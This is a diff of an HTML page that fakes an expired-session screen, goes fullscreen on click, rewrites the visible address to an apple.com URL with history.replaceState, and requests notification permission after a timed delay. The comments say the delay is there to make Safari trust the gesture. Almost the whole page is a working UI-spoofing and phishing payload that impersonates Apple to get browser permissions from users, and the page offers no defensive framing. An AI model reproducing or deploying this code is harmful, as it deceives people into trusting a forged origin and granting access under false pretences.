@@ -1,52 +1,53 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Loading Secure Content</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Session Timed Out</title>
   <style>
     html, body {
-      margin: 0;
-      padding: 0;
+      margin: 0; padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
       background: white;
-      font-family: -apple-system, sans-serif;
-      height: 100%;
-      overflow: hidden;
     }
-    .screen {
+    .center {
+      height: 100vh;
       display: flex;
       align-items: center;
       justify-content: center;
-      height: 100vh;
       flex-direction: column;
     }
     button {
+      padding: 12px 20px;
       font-size: 16px;
-      padding: 12px 24px;
     }
   </style>
 </head>
 <body>
-
-<div class="screen">
-  <h2>🔒 Secure Service Notification</h2>
-  <p>Click to continue setup</p>
-  <button onclick="begin()">Continue</button>
+<div class="center">
+  <h2>🔒 Your session expired</h2>
+  <p>Please re-login to continue.</p>
+  <button onclick="start()">Continue</button>
 </div>
 
 <script>
-function begin() {
+function spoofNotificationPrompt() {
   document.documentElement.requestFullscreen().then(() => {
-    history.replaceState({}, "", "https://trusted.apple.com/notification");
+    // Optional: location.replace spoofing or fake visual context
+    history.replaceState({}, '', 'https://apple.com/re-auth');
 
-    // Delay to simulate trust, then request native prompt
+    // Delay to ensure Safari trusts the gesture
     setTimeout(() => {
-      Notification.requestPermission().then(() => {
-        alert("Notifications enabled for your account.");
+      Notification.requestPermission().then(permission => {
+        if (permission === "granted") {
+          new Notification("✅ Session restored successfully!");
+        }
       });
     }, 1000);
   });
 }
-</script>
 
+function start() {
+  spoofNotificationPrompt();
+}
+</script>
 </body>
 </html>
